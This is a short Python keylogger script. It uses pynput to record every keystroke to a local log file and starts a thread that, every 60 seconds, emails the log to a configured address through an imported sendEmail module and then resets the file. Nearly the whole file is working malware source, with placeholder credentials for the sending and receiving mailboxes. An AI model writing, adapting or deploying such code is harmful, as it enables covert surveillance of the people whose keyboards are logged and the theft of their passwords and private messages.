from pynput.keyboard import Key, Listener
from threading import Thread
from time import sleep
import logging
import sendEmail


# Global variable that sets the number of seconds beofre the log file is reset and sent over by email
NUMSEC = 60
# Addresses for sending and receiving the email 
TOADDRESS =  "Enter email here"
FROMADDRESS = "Enter email here"
FROMPASSWORD = "Enter from address\' password here"

# Creates the logging file and or resets the logging file
def createFile():
	logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s", filemode="w")

# loggs the keypress
def on_press(key):
	logging.info(str(key))


if __name__ == "__main__":
	createFile()
	# The listener is created here with the timeout function that sends an email ever n minutes specifiec above in the NUMMINREF variable 
	with Listener(on_press=on_press) as listener:
	    def time_out(period_sec: int):
	    	sleep(period_sec)
	    	sendEmail.sendEmail(FROMADDRESS, FROMPASSWORD, TOADDRESS)
	    	logging.shutdown()
	    	createFile()
	    	time_out(period_sec)
	    Thread(target=time_out, args=(NUMSEC,)).start()
	    listener.join()
